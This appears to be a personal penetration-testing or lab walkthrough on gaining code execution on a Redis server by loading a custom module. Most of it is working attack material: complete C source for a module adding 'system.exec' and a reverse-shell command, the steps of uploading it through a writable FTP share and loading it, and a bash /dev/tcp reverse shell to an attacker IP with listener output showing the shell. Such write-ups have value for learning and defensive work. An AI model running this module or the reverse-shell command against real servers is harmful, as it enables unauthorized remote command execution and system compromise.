# Redis Module Load

---

We can build an redis module, load it into redis and get command execution.

## How To

1. Download it locally.

```
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git
```

Navigate into the directory and "make".

Didn't work, had to fix the source code of "module.c" file.

```
#include "redismodule.h"
#include <string.h>  // For strlen, strcat
#include <arpa/inet.h>  // For inet_addr
#include <stdio.h> 
#include <unistd.h>  
#include <stdlib.h> 
#include <errno.h>   
#include <sys/wait.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>

int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
        if (argc == 2) {
                size_t cmd_len;
                size_t size = 1024;
                char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);

                FILE *fp = popen(cmd, "r");
                char *buf, *output;
                buf = (char *)malloc(size);
                output = (char *)malloc(size);
                while ( fgets(buf, sizeof(buf), fp) != 0 ) {
                        if (strlen(buf) + strlen(output) >= size) {
                                output = realloc(output, size<<2);
                                size <<= 1;
                        }
                        strcat(output, buf);
                }
                RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
                RedisModule_ReplyWithString(ctx, ret);
                pclose(fp);
        } else {
                return RedisModule_WrongArity(ctx);
        }
        return REDISMODULE_OK;
}

int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
        if (argc == 3) {
                size_t cmd_len;
                char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
                char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
                int port = atoi(port_s);
                int s;

                struct sockaddr_in sa;
                sa.sin_family = AF_INET;
                sa.sin_addr.s_addr = inet_addr(ip);
                sa.sin_port = htons(port);

                s = socket(AF_INET, SOCK_STREAM, 0);
                connect(s, (struct sockaddr *)&sa, sizeof(sa));
                dup2(s, 0);
                dup2(s, 1);
                dup2(s, 2);

                char *args[] = {"/bin/sh", NULL};
                char *env[] = {NULL};
                execve("/bin/sh", args, env);
        }
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx,"system",1,REDISMODULE_APIVER_1)
                        == REDISMODULE_ERR) return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.exec",
        DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
          if (RedisModule_CreateCommand(ctx, "system.rev",
        RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    return REDISMODULE_OK;
}
```


Build the module

```
make
```

Received module.so file.

My next objective is to get the file somehow onto the server system.

In my case I had write access into an ftp share named "pub". --> default ftp path /var/ftp/pub

```
put module.so
```

I logged into redis-cli and loaded the module onto redis.

```
redis-cli -h 192.168.198.93
192.168.198.93:6379> MODULE LOAD /var/ftp/pub/module.so
OK
```

Now I got command execution

```
192.168.198.93:6379> system.exec "id"
"uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)\n"
```

## RCE

Start up listener.

```
nc -lvnp 80
```

Execute system command in redis.

```
192.168.198.93:6379> system.exec "bash -i >& /dev/tcp/192.168.45.202/80 0>&1"
```

Gained RCE.

```
nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.198.93] 36226
bash: no job control in this shell
[pablo@sybaris /]$
```
